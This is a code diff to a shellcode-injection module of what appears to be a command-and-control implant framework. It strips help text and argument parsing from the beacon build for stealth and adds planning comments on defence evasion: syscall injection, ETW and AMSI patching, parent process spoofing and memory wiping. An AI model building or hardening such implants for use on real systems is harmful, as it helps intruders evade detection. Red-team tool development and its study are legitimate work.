@@ -48,9 +48,12 @@ AssemblyExec::~AssemblyExec()
 {
 }
 
+
+// OPSEC remove getHelp and getInfo strings from the beacon compilation
 std::string AssemblyExec::getInfo()
 {
 	std::string info;
+#ifdef BUILD_TEAMSERVER
 	info += "assemblyExec:\n";
 	info += "Execute shellcode in a process (notepad.exe), wait for the end of execution or a timeout (120 sec). Retrieve the output.\n";
 	info += "Use -r to use a shellcode file.\n";
@@ -60,12 +63,15 @@ std::string AssemblyExec::getInfo()
 	info += "- assemblyExec -e ./program.exe arg1 arg2...\n";
 	info += "- assemblyExec -e ./Seatbelt.exe -group=system\n";
 	info += "- assemblyExec -d ./test.dll method arg1 arg2...\n";
-	
+#endif
 	return info;
 }
 
+// TODO create a new init with boost arguement parsing if just compiled on teamServerSide
+// OPSEC remove init from the beacon compilation
 int AssemblyExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
+#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
 	if (splitedCmd.size() >= 3)
 	{
 		bool donut=false;
@@ -179,7 +185,7 @@ int AssemblyExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Messag
 		c2Message.set_returnvalue(getInfo());
 		return -1;
 	}
-
+#endif
 	return 0;
 }
 
@@ -329,6 +335,12 @@ int AssemblyExec::createNewThread(const std::string& payload, std::string& resul
 	return 0;
 }
 
+// OPSEC use syscall for injection
+// OPSEC patch etw et amsi
+// OPSEC choose the process as an argument
+// OPSEC in CS the sacrificial process communicate with PIPE, name or anonymous like here ?
+// OPSEC parent process spoofing
+// OPSEC wipe memory of the shellcode in the remote process at the end
 
 // Create a new process in suspended mode to run the shellcode.
 int AssemblyExec::createNewProcess(const std::string& payload, const std::string& processToSpawn, std::string& result)
